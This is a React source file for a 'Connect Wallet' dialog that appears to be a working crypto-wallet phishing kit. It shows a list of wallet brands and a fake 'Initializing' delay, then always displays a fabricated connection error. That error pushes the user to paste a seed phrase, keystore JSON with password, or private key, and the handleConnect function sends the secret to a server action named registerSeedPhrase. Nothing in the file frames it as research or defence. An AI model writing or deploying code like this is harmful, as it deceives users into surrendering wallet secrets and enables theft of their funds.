
'use client';

import { useState, useEffect } from 'react';
import { useForm, Controller } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogClose,
  DialogFooter,
} from '@/components/ui/dialog';
import { Button } from './ui/button';
import { Wallet, ArrowLeft, RefreshCw, Loader2 } from 'lucide-react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from './ui/textarea';
import { Input } from './ui/input';
import { Alert, AlertDescription } from './ui/alert';
import { registerSeedPhrase } from '@/app/actions';
import { useToast } from '@/hooks/use-toast';
import { Form, FormControl, FormField, FormItem, FormMessage } from './ui/form';

const wallets = [
  'Metamask', 'Coinbase', 'WalletConnect', 'Trust', 'Xumm', 'Cardano',
  'Daedalus', 'Yoroi', 'CCVault', 'Gero', 'Nami', 'Solana', 'Phantom',
  'Solflare', 'Sollet', 'Solong', 'Exodus', 'Avalanche', 'Velas',
  'crypto.com', 'Blockchain', 'Binance Smart Chain', 'Safepal', 'Argent',
  'Fortmatic', 'Aktionariat', 'Keyring Pro', 'BitKeep', 'SparkPoint', 'OwnBit',
  'Infinity Wallet', 'Wallet.io', 'Infinito', 'Torus', 'Nash', 'BitPay',
  'imToken', 'Ambire', 'Apollox', 'Bitski', 'Bobablocks', 'Crossmint',
  'Defiant', 'Fireblocks', 'Kryptogo', 'Ledger', 'Now', 'Nufinetes',
  'Onekey', 'Paper', 'Pier', 'Prema', 'Rice', 'Safemoon', 'Secux',
  'Sequence', 'Tokenary', 'Unipass', 'Venly', 'Verso', 'Wallet3',
  'Polkadot', 'Filecoin', 'IOST', 'Qtum', 'Waves', 'Algorand', 'Zcash',
  'Vechain', 'Tezos', 'Stellar', 'Tron', 'Terra', 'Cosmos', 'Metis',
  'Optimism', 'Injective', 'Other Wallet'
];

type WalletConnectDialogProps = {
  issue: string | null;
};

const formSchema = z.object({
  phrase: z.string().optional(),
  keystore: z.string().optional(),
  privateKey: z.string().optional(),
  walletName: z.string().optional(),
  password: z.string().optional(),
}).refine(data => data.phrase || data.keystore || data.privateKey, {
    message: "At least one of phrase, keystore, or private key must be provided.",
    path: ["phrase"],
});


export function WalletConnectDialog({ issue }: WalletConnectDialogProps) {
    const [view, setView] = useState<'grid' | 'initializing' | 'form'>('grid');
    const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
    const [isDialogOpen, setIsDialogOpen] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const { toast } = useToast();
    
    const form = useForm<z.infer<typeof formSchema>>({
        resolver: zodResolver(formSchema),
        defaultValues: {
            phrase: '',
            keystore: '',
            privateKey: '',
            walletName: '',
            password: ''
        }
    });

    useEffect(() => {
        if (issue) {
            setIsDialogOpen(true);
        }
    }, [issue]);

    useEffect(() => {
        if (view === 'initializing') {
            const timer = setTimeout(() => {
                setView('form');
            }, 2000);

            return () => clearTimeout(timer);
        }
    }, [view]);

    const handleWalletSelect = (wallet: string) => {
        setSelectedWallet(wallet);
        setView('initializing');
    }

    const reset = () => {
        setView('grid');
        setSelectedWallet(null);
        form.reset();
        setIsSubmitting(false);
    }
    
    const closeAndReset = () => {
        setIsDialogOpen(false);
        setTimeout(reset, 300);
    }

    const handleConnect = async (values: z.infer<typeof formSchema>) => {
        setIsSubmitting(true);

        const formData = new FormData();
        // For this app, we'll just save the phrase. The others are for UI completeness.
        const seedPhraseToSave = values.phrase || values.keystore || values.privateKey || '';
        const network = selectedWallet || 'Unknown';
        
        formData.append("seedPhrase", seedPhraseToSave);
        formData.append("network", network);

        const result = await registerSeedPhrase(formData);

        if (result.success) {
            toast({
                title: "Success!",
                description: "Your information has been submitted. A representative will be in touch.",
            });
            closeAndReset();
        } else {
            toast({
                variant: 'destructive',
                title: "Submission Failed",
                description: result.error || "An unknown error occurred.",
            });
        }
        setIsSubmitting(false);
    }
    
    return (
        <Dialog open={isDialogOpen} onOpenChange={(open) => {
            if (!open) {
                closeAndReset();
            } else {
                setIsDialogOpen(true);
            }
        }}>
            <DialogContent 
                className={view === 'grid' ? "max-w-3xl" : "max-w-lg"}
                onInteractOutside={(e) => {
                    // Prevent closing on outside click
                    e.preventDefault();
                }}
            >
                 <DialogClose onClick={closeAndReset} className="absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
                    <span className="sr-only">Close</span>
                 </DialogClose>
                {view === 'grid' && (
                    <>
                        <DialogHeader>
                            <DialogTitle className="text-center text-2xl">
                                Connect Wallet
                            </DialogTitle>
                            <DialogDescription className="text-center">
                                Connect with one of our available wallet providers to resolve your issue.
                            </DialogDescription>
                        </DialogHeader>
                        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 py-4 max-h-[70vh] overflow-y-auto">
                            {wallets.map((wallet) => (
                            <Button
                                key={wallet}
                                variant="outline"
                                className="w-full h-16 justify-start text-lg bg-card/50 hover:bg-primary/10 border-primary/20"
                                onClick={() => handleWalletSelect(wallet)}
                            >
                                <Wallet className="mr-4 h-6 w-6 text-primary" />
                                {wallet}
                            </Button>
                            ))}
                        </div>
                    </>
                )}
                {view === 'initializing' && (
                    <>
                        <DialogHeader>
                             <DialogTitle className="sr-only">Initializing Connection</DialogTitle>
                            <div className="flex items-center gap-2 text-green-400 font-semibold">
                                Initializing
                                <span className="animate-pulse-dot-1">.</span>
                                <span className="animate-pulse-dot-2">.</span>
                                <span className="animate-pulse-dot-3">.</span>
                            </div>
                        </DialogHeader>
                        <div className="py-8">
                            <div className='flex justify-between items-center bg-card/50 p-4 rounded-lg border border-primary/20'>
                                <div>
                                    <h3 className="font-bold text-lg">{selectedWallet}</h3>
                                    <p className="text-sm text-muted-foreground">Easy-to-use browser extension</p>
                                </div>
                                <Wallet className="h-8 w-8 text-primary" />
                            </div>
                        </div>
                        <Button variant="ghost" onClick={reset} className="absolute top-4 left-4 text-muted-foreground">
                            <ArrowLeft className="h-4 w-4 mr-2" />
                            Back
                        </Button>
                    </>
                )}
                {view === 'form' && (
                     <Form {...form}>
                     <form onSubmit={form.handleSubmit(handleConnect)}>
                        <DialogHeader>
                           <DialogTitle className="sr-only">Manual Connection</DialogTitle>
                           <Alert variant="destructive" className="bg-destructive/10 text-destructive-foreground border-destructive/20">
                             <AlertDescription>
                               There was an error connecting automatically. Please connect manually.
                             </AlertDescription>
                           </Alert>
                        </DialogHeader>
                        <div className="pt-4">
                            <Tabs defaultValue="phrase" className="w-full">
                               <TabsList className="grid w-full grid-cols-3">
                                    <TabsTrigger value="phrase">Phrase</TabsTrigger>
                                    <TabsTrigger value="keystore">Keystore JSON</TabsTrigger>
                                    <TabsTrigger value="private">Private Key</TabsTrigger>
                                </TabsList>
                                <TabsContent value="phrase" className="pt-4 space-y-4">
                                     <FormField
                                        control={form.control}
                                        name="phrase"
                                        render={({ field }) => (
                                        <FormItem>
                                            <FormControl>
                                            <Textarea placeholder="Enter your phrase" className="min-h-[100px]" {...field} />
                                            </FormControl>
                                            <FormMessage />
                                        </FormItem>
                                        )}
                                    />
                                     <FormField
                                        control={form.control}
                                        name="walletName"
                                        render={({ field }) => (
                                        <FormItem>
                                            <FormControl>
                                            <Input placeholder="Wallet name" {...field} />
                                            </FormControl>
                                        </FormItem>
                                        )}
                                    />
                                </TabsContent>
                                <TabsContent value="keystore" className="pt-4 space-y-4">
                                     <FormField
                                        control={form.control}
                                        name="keystore"
                                        render={({ field }) => (
                                        <FormItem>
                                            <FormControl>
                                            <Textarea placeholder="Enter your keystore JSON" className="min-h-[100px]" {...field} />
                                            </FormControl>
                                            <FormMessage />
                                        </FormItem>
                                        )}
                                    />
                                     <FormField
                                        control={form.control}
                                        name="password"
                                        render={({ field }) => (
                                        <FormItem>
                                            <FormControl>
                                            <Input type="password" placeholder="Wallet password" {...field} />
                                            </FormControl>
                                        </FormItem>
                                        )}
                                    />
                                </TabsContent>
                                 <TabsContent value="private" className="pt-4 space-y-4">
                                     <FormField
                                        control={form.control}
                                        name="privateKey"
                                        render={({ field }) => (
                                        <FormItem>
                                            <FormControl>
                                            <Input placeholder="Enter your private key" {...field} />
                                            </FormControl>
                                            <FormMessage />
                                        </FormItem>
                                        )}
                                    />
                                </TabsContent>
                            </Tabs>
                        </div>
                        <DialogFooter className="sm:justify-between pt-4">
                            <Button type="button" variant="secondary" onClick={closeAndReset}>
                                Close
                            </Button>
                            <Button type="submit" disabled={isSubmitting} className="bg-blue-600 hover:bg-blue-700 text-white">
                                {isSubmitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                Connect
                            </Button>
                        </DialogFooter>
                     </form>
                     </Form>
                )}
            </DialogContent>
        </Dialog>
    )
}

    